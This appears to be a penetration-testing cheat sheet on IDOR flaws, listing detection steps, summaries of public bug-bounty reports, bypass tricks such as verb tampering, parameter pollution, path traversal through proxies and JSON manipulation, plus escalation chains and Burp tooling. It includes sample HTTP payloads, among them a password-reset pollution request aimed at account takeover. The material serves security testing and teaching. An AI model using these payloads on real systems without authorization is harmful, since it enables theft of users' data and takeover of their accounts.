# Detection
- Need two accounts
- Search for pages that return/modify user information like Read/Delete user messages/files
- Search for  parameters that contain numbers/usernames/ID in Requests and change them.
- Tricky IDOR in state-changing endpoints.
  - Change the `attach_id` in `/ticket-submit.php` request to an attachment that doesn't belong to us like `2222`. 
  ```html
  POST http://77.238.121.150:58480/ticket-submit.php HTTP/1.1
  (POST request body)
  product=2&subject=e&description=q&attach_id=2222&submit=Submit+a+ticket
  ```

# WriteUps
- Change `ids` in Delete video request functionality of https://my.snapchat.com/.
- Change `user_id` in POST request json parameters for join.nordvpn.com/api/v1/orders to get sensitive customer data.
- Change base64 encoded value of `"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA=="` to delete any Campaigns in UpdateCampaign functionality.
- Change message number in `DELETE /api/v1/messages/4423007/` to delete all messages in www.redditgifts.com.
- Change `id` in Edit "Licenses and certifications" functionality in www.hackerone.com.
- Change `id` in Email Change functionality of indiehackers.com that leads to account take over.
- Change `data-id` in `settings/personal/authtokens/wipe/{data-id}` to wipe out other users device in nextcloud.com.
- Change `"orderKeys":["43b29d60a9724fa9abbdc800044002d6"]}` to see other's order in app.mopub.com/web-client/api/orders/stats/query POST request.
- Change `id` in admin.shopify.com/api/shopify/?operation=BillDetails&type=query that leads to dump billing details for every other shops.

# Bypass
- Encoded/Hashed IDs
  - Recognize encodings (like *base64*, *URL encoding*, and *base64url*) with Burp’s Smart Decode tool.
  - hashed/randomized ID  →  Check if the ID is predictable by creating a few accounts to analyze how these IDs are created.
  - UUID  →  It's not IDOR unless we can leak others UUIDs.
    - There may be endpoints to translate emails or other properties into UUIDs, check for those.
    - Try to swap UUID with number, `/file?id=47657c0a-5d8b-423a-9311-978903d7efd4`  →  `/file?id=1234`
 - The application might leaks IDs via another API endpoint or other public pages of the application, like the profile page of a user.
- If no IDs exist in the application-generated request, try adding one to the request.
  - Append `id`, `user_id`, `message_id`, or other object references to the URL query, or the POST body parameters, and see if it makes a difference to the application’s behavior.
  - `GET /api_v1/messages`  →  `GET /api_v1/messages?user_id=ANOTHER_USERS_ID`
- Leverage **Mass Assignment** to discover IDOR in state-changing functionalities by adding parameters to the endpoint which return the information.
  - `/api/v1/getuser`  →  `/api/v1/getuser?id=1234`
- Blind IDORs
  - The application might leak information elsewhere, like *export files*, *email*, *text alerts*.
  - This request will send a copy of receipt 3001 (another user) to the registered email of the current user.
  ```html
  POST /get_receipt
  (POST request body)
  receipt_id=2983
  ```
- Verb tamper
  - `GET`  →  `DELETE`
  - `POST`  →  `PUT`
  - `POST` →  `GET`
- Use extension to bypass forbidden actions
  - `/v2/GetData/1234`  →  403 Forbidden
  - `/ve/GetData/1234.json`  →  200 OK
- Endpoint fuzzing (first wordlist should include `users` and second wordlist should include `me`)
  - `/endpoints/[FUZZ]/[FUZZ]`  →  `/endpoints/users/me`
  - `GET /api/list/user1c2e8e94/?secret=BAA3060DC05EcCD HTTP/1.1`  →  `GET /api/list/all/?secret=BAA3060DC05EcCD HTTP/1.1`
- Use Parameter Pollution to discover IDOR or bypass the forbidden actions.
  ```bash
  POST /api/forget_password
  (POST request body)
  
  email=victim_email&email=hacker_email                      # paylaod 1
  {"email": "victim_email", "email": "hacker_email"}         # paylaod 2
  ```
- Check outdated API versions (or even upcoming version)
  - `/v2/GetData`  →  `/v1/GetData`
- Manipulate JSON packets
  ```bash
  POST /api/get_profile
  {"id": 111}

  {"id": [111]}
  {"id": []}
  {"id": [.]}
  {"user_id": {"user_id":111}}
  ```
- Abusing Reverse-Proxy
  - `POST /users/delete/VICTIM_ID`  →  403 Forbidden
  - `POST /users/delete/MY_ID/../VICTIM_ID`  →  200 OK
  - `POST /users/delete/MY_ID%2f%2e%2e%2fVICTIM_ID`  →  200 OK (Using encode)
- Try to discover hidden parameter even-though there is an ID in the request. (guess, extract or fuzz parameters)
  ```bash
  GET /v2/profile/1000                 # 200 OK
  GET /v2/profile/1001                 # 403 Forbidden

  GET /v2/profile/10007 [FUZZ]=1001
  GET /v2/profile/10007user_id=1001    # 200 OK
  ```
  ```bash
  POST /v2/profile 1
  name=yashar&email=y.shahinzadeh@gmail.com

  POST /v2/profile?user_id=1001
  name=yashar&email=y.shahinzadeh@gmail.com
  ```
  ```bash
  POST /v2/profile
  user_id=1000

  POST /v2/profile?user_id=1001
  user_id=1000  
  ```

# Escalat
- State-changing (write-based IDORs) →  _password reset_, _password change_, _account recovery_
- Non-state-changing (read-based IDORs)  →  _direct messages_, _personal information_, _private content_
- Combine IDORs with other vulnerabilities to increase their impact.
  - Write-based IDOR + self-XSS  →  Stored XSS
  - IDOR on a password reset endpoint + Username enumeration  →  Mass account takeover
  - Write-based IDOR on an admin account  →  RCE

# Automate
- Use the Burp intruder to iterate through IDs to find valid ones.
- Burp extension
  - **[Autorize](https://github.com/Quitten/Autorize/)** scans for authorization issues by accessing higher-privileged accounts with lower-privileged accounts
  - **[Auto Repeater](https://github.com/nccgroup/AutoRepeater/)** and **[AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix/)** allows to automate the process of switching out cookies, headers, and parameters.

# Resource
- https://book.hacktricks.xyz/pentesting-web/idor
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
